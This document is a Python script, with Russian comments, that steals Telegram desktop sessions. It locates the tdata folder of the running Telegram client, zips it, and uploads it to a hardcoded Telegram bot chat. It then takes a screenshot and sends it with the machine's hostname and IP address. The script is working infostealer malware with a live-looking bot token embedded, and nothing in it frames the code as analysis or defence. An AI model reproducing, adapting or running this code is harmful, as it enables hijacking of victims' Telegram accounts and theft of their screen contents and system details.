
import os
import zipfile
import requests
from io import BytesIO
from PIL import ImageGrab
import socket
import logging
import psutil
import datetime

# Замените на ваш токен и ID чата
telegram_bot_token = "6325945971:AAHwMsztDQvH_7eSN7-xnTj8D685-yVp4uc"
chat_ids = ["1882056354", ]
system_name = os.name
hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)


class TelegramLogHandler(logging.Handler):
    """
    Пользовательский обработчик логов, который отправляет сообщения в Telegram.
    """

    def __init__(self, token, chat_ids):
        super().__init__()
        self.token = token
        self.chat_ids = chat_ids

    def emit(self, record):
        log_entry = self.format(record)
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        for chat_id in self.chat_ids:
            try:
                data = {'chat_id': chat_id, 'text': log_entry}
                response = requests.post(url, data=data)
                response.raise_for_status()
            except requests.exceptions.RequestException as e:
                print(f"Failed to send log to telegram: {e}")


# Настройка логирования
logger = logging.getLogger()
logger.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

# Добавление Telegram Handler
telegram_handler = TelegramLogHandler(telegram_bot_token, chat_ids)
telegram_handler.setFormatter(formatter)
logger.addHandler(telegram_handler)


def find_telegram_tdata():
    """
    Пытается найти папку tdata, основываясь на процессе Telegram.
    Возвращает путь к папке tdata или None, если не найдено.
    """
    for process in psutil.process_iter(['name', 'exe']):
        try:
            if "telegram" in process.info['name'].lower():
                exe_path = process.info['exe']
                if exe_path:
                    tdata_path = os.path.join(os.path.dirname(exe_path), 'tdata')
                    if os.path.exists(tdata_path):
                        logger.info(f"tdata found in telegram directory: {tdata_path}")
                        return tdata_path
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    logger.warning("tdata folder not found in telegram directory.")
    return None


def send_message_to_group(chat_id, screenshot):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
    data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
    image_buffer = BytesIO()
    screenshot.save(image_buffer, format='JPEG')
    image_buffer.seek(0)
    files = {'photo': ('screenshot.jpg', image_buffer)}
    try:
        response = requests.post(url, data=data, files=files)
        response.raise_for_status()
        logger.info(f"Screenshot sent successfully to chat ID: {chat_id}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Error sending screenshot to Telegram. Chat ID: {chat_id}. Error: {e}")


def send_file_to_telegram(file_path, file_name):
    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
    for chat_id in chat_ids:
        try:
            with open(file_path, 'rb') as file:
                files = {'document': (file_name, file)}
                data = {'chat_id': chat_id}
                response = requests.post(url, files=files, data=data)
                response.raise_for_status()
                logger.info(f"File '{file_name}' sent successfully to chat ID: {chat_id}")
        except FileNotFoundError:
            logger.error(f"Error: File '{file_path}' not found.")
        except requests.exceptions.RequestException as e:
            logger.error(f"Error sending file to Telegram. Chat ID: {chat_id}. Error: {e}")


def create_zip_archive(source_dir, output_zip):
    try:
        with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
            for root, _, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    if "user_data" in file_path or "webview" in file_path or "temp" in file_path or "emoji" in file_path or "shortcuts-default.json" in file_path or "working" in file_path:
                        continue
                    try:
                        zipf.write(file_path, os.path.relpath(file_path, source_dir))
                    except Exception as e:
                        logger.error(f"Error adding file to zip: {str(e)}")
        logger.info(f"Successfully created zip archive: {output_zip}.zip")
        return output_zip + '.zip'
    except Exception as e:
        logger.error(f"Error creating zip archive: {str(e)}")
        return None


if __name__ == '__main__':
    try:
        tdata_path = find_telegram_tdata()
        if tdata_path:
            logger.info("tdata folder found, creating and sending zip")
            temp_dir = os.path.join(os.getcwd(), 'temp')
            if not os.path.exists(temp_dir):
                os.makedirs(temp_dir)
            output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
            created_zip = create_zip_archive(tdata_path, output_zip)
            if created_zip:
                send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
                screenshot = ImageGrab.grab()
                for chat_id in chat_ids:
                    send_message_to_group(chat_id, screenshot)
            else:
                logger.error("Failed to create or send zip file.")
        else:
            logger.warning("tdata folder not found in telegram directory.")
    except Exception as e:
        logger.exception(f"An unexpected error occurred: {e}")
